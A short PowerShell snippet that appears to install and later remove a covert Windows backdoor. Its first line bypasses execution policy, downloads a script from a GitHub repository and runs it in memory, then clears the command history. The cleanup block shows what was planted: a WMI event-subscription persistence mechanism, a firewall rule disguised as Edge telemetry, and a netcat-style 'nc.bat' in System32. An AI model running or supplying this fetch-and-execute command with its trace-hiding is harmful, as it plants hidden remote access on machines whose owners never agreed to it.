> powershell -ExecutionPolicy Bypass -Command "iwr -Uri 'https://raw.githubusercontent.com/SunTzv/WinNetVerify/main/setup.ps1' | iex; Clear-History"


```
# Kill the Ghost
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WinNetVerifyFilter"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "WinNetVerifyConsumer"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match "WinNetVerifyFilter"} | Remove-WmiObject

# Delete the Rule & Files
Remove-NetFirewallRule -DisplayName "MicrosoftEdgeTelemetryOptimization" -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\System32\nc.bat" -Force
Remove-Item "C:\ProgramData\WinNetVerify" -Recurse -Force
```